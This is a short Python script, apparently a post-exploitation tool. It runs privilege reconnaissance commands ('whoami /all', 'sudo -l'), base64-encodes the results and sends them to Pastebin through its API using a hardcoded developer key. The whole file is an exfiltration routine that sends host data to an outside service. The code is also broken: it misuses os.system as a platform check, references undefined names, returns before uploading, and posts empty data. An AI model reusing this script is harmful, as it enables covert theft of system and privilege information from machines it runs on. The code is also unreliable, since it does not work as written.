import base64
from os import system
import platform
import requests
import urllib.parse
import urllib.request
import socket
import getpass
from subprocess import PIPE, Popen

url = 'https://pastebin.com/api/api_post.php'
key = 'k31l-n1pP1AA-Vnz0rfxRAaVuqEi65tX'
log = 'https://pastebin.com/api/api_login.php'
name = 'username pengguna'
passw = 'password user'

def main():
    if system() == "Windows":
        process = Popen("whoami /all", stdin = PIPE , stdout = PIPE, stderr = PIPE, shell = True)
        result, error = process.communicate()
    elif system() == "Linux":
        process = Popen("sudo -l", stdin = PIPE , stdout = PIPE, stderr = PIPE, shell = True)
        result, error = process.communicate()

    if error != b'':
        print(error.decode())
        sys.exit(0)
    elif result != b'':
        msg = f"Host Reconnaissance Result :\n{result.decode()}"
        Enc = base64.b64encode(msg.encode())
        return Enc

    info = {
        'api_dev_key' : key,
        'api_username' : name,
        'api_password' : passw,
    }

    r = post(log, data = info)

    credits = {
        "api_dev_key": key, 
        "api_paste_name" : "recon",
        "api_option": "paste",  
        "api_paste_code": base64.b64encode(b''), 
        "api_user_key":  key_user
    } 

    r = post(url, data =credits)

    print(r.text)
